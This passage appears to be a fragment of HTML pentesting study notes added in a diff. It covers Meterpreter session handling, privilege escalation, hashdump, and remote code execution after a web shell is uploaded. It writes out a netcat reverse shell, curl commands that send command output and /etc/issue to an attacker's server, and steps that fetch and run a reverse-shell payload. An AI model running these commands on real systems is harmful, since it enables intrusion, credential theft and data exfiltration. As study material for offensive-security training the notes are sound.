+<p><strong>background</strong></p>
+<ul>
+<li>Switches from the session back to msfconsole</li>
+</ul>
+</li>
+<li>
+<p><strong>sessions -l</strong></p>
+<ul>
+<li>List opened sessions</li>
+</ul>
+</li>
+<li>
+<p><strong>sessions -i (session ID)</strong></p>
+<ul>
+<li>Resume a session</li>
+</ul>
+</li>
+<li>
+<p><strong>sysinfo</strong></p>
+<ul>
+<li>Gives information about the victims machine</li>
+</ul>
+</li>
+<li>
+<p><strong>ifconfig</strong></p>
+<ul>
+<li>Prints network config</li>
+</ul>
+</li>
+<li>
+<p><strong>route</strong></p>
+<ul>
+<li>Shows routing information</li>
+</ul>
+</li>
+<li>
+<p><strong>getuid</strong></p>
+<ul>
+<li>Gives info on the user running the exploited process</li>
+</ul>
+</li>
+<li>
+<p><strong>shell</strong></p>
+<ul>
+<li>Run an OS shell</li>
+</ul>
+</li>
+<li>
+<p>Explore the victims machine with Unux-like shell commands</p>
+<ul>
+<li>eg pwd, ls, cd etc...</li>
+<li>Remember to escape backslashes when escaping
+<ul>
+<li><strong>cd C:\</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="1061-priviledge-escalation-in-meterpreter">10.6.1 Priviledge Escalation in Meterpreter</h4>
+<ul>
+<li>
+<p><strong>getsystem</strong></p>
+<ul>
+<li>Runs a priviledge escalation routine</li>
+</ul>
+</li>
+<li>
+<p>If Windows system is fairly modern, the User Account Policy has to be bypassed</p>
+<ul>
+<li>use <strong>bypassuac</strong>
+<ul>
+<li>Search msfconsole and select the meterpreter session to apply the exploit to</li>
+</ul>
+</li>
+<li>If all goes according to plan, the <strong>getsystem</strong> command should now work</li>
+</ul>
+</li>
+</ul>
+<h4 id="1062-password-dumping-in-meterpreter">10.6.2 Password Dumping in Meterpreter</h4>
+<ol>
+<li>Use <strong>hashdump</strong> module</li>
+<li>Select session</li>
+<li>Exploit!</li>
+</ol>
+<h4 id="1063-uploading-and-downloading-files-in-meterpreter">10.6.3 Uploading and Downloading Files in Meterpreter</h4>
+<ul>
+<li><strong>upload (file) (path)</strong></li>
+<li><strong>download (file) (path)</strong></li>
+</ul>
+<h2 id="11-rce-tips-and-tricks">11 RCE Tips and Tricks</h2>
+<h3 id="111-blind-injections">11.1 Blind Injections</h3>
+<ul>
+<li>
+<p>When encoutering blind inputs where its not clear if the input changes server behaviour</p>
+</li>
+<li>
+<p>Try sleep commands</p>
+<ul>
+<li>Check burp suite response time from server if it changes depending on the input</li>
+<li><strong>sleep+(time)</strong></li>
+</ul>
+</li>
+<li>
+<p>Try pinging the server from Burp</p>
+<ul>
+<li><strong>ping (localhost) -c (n of pings)</strong></li>
+<li>Mark command -&gt; <em>convert selection</em> -&gt; <em>URL</em> -&gt; <em>URL Encode All Characters</em></li>
+<li>Capture data with wireshark and check if server is pinging localhost</li>
+</ul>
+</li>
+</ul>
+<h3 id="112-after-uploading-a-simple-non-interactive-php-shell">11.2 After Uploading a Simple Non-Interactive PHP Shell</h3>
+<h4 id="1121-identify-constraints">11.2.1 Identify constraints</h4>
+<ul>
+<li>Check available tools on the web server</li>
+<li>Upload our own tools</li>
+<li><strong>Check $PATH</strong>
+<ul>
+<li>echo $PATH</li>
+<li><strong>ls /path/files</strong></li>
+<li><strong>which (tool)</strong>
+<ul>
+<li>nc?</li>
+<li>python or other languages installed?</li>
+<li>curl or wget?</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="1122-trying-to-spawn-bash-on-connection">11.2.2 Trying to Spawn Bash on Connection</h4>
+<ul>
+<li>
+<p><strong>nc -lvp 53</strong></p>
+<ul>
+<li>Netcat server on localost port 53</li>
+</ul>
+</li>
+<li>
+<p>On web server</p>
+<ul>
+<li><strong>nc (localhost port of attackers nc server):(port) -e /bin/bash</strong></li>
+<li>Often dissapointing to rely on netcat, try curl</li>
+</ul>
+</li>
+<li>
+<p>Abusing <em>curl</em> to get RCE</p>
+<ul>
+<li>
+<p>set up netcat listener</p>
+</li>
+<li>
+<p>Curl the attackers server form webserver</p>
+<ul>
+<li>
+<pre><code class="language-bash"><div>curl http://(attacker lhost IP):(nc port)/`whoami`
+
+</div></code></pre>
+</li>
+<li>
+<p>Check HTTP request from server</p>
+<ul>
+<li>If the request is sendt from a remote server(e.g /www-data), a blind code injection vulnerability might be present</li>
+<li>Could be the only way to get output from underlying commands being executed</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Encode data from server</p>
+<ul>
+<li>
+<p>When requests are not displaying the commands in a usefull way</p>
+<ul>
+<li>e.g output is /UID=33 /www-data</li>
+</ul>
+</li>
+<li>
+<p><strong>Try base64</strong></p>
+<ul>
+<li>
+<pre><code class="language-bash"><div>curl http://(attacker IP)(nc port)/`id` | base64
+
+</div></code></pre>
+</li>
+</ul>
+</li>
+<li>
+<p>Decode it</p>
+<ul>
+<li>echo (encoded string) | base64 -d</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<h4 id="1123-transferring-files-with-curl">11.2.3 Transferring Files with Curl</h4>
+<ul>
+<li>
+<p>Transfer files with PUT in curl</p>
+<ul>
+<li><strong>curl (attackers IP):(nc port)/file -T /etc/issue</strong></li>
+</ul>
+</li>
+<li>
+<p>Transfer metasploit reverse shell payload</p>
+<ul>
+<li><strong>python -m SimpleHTTPServer (port)</strong>
+<ul>
+<li>Start it from the directory with the file to be transferred</li>
+</ul>
+</li>
+<li>Generate reverse shell payload with metasploit</li>
+<li>GET with curl
+<ul>
+<li><strong>curl (attackers IP):(nc port)/payload_file -o /tmp/r</strong></li>
+<li><strong>chmod +x /tmp/r</strong></li>
+<li>Confirm it exists by trying to upload it back
+<ul>
+<li><strong>curl (attackers IP):(nc port) -T /tmp/r</strong></li>
+</ul>
+</li>
+<li>Run it
+<ul>
+<li><strong>/tmp/r</strong></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li>
+<p>Upgrading shell to terminal</p>
+<ul>
+<li><strong>bask -i</strong></li>
+<li>spawning TTY shell with python(search the webbs)</li>
+</ul>
+</li>
+</ul>
+
+    </body>
+    </html>
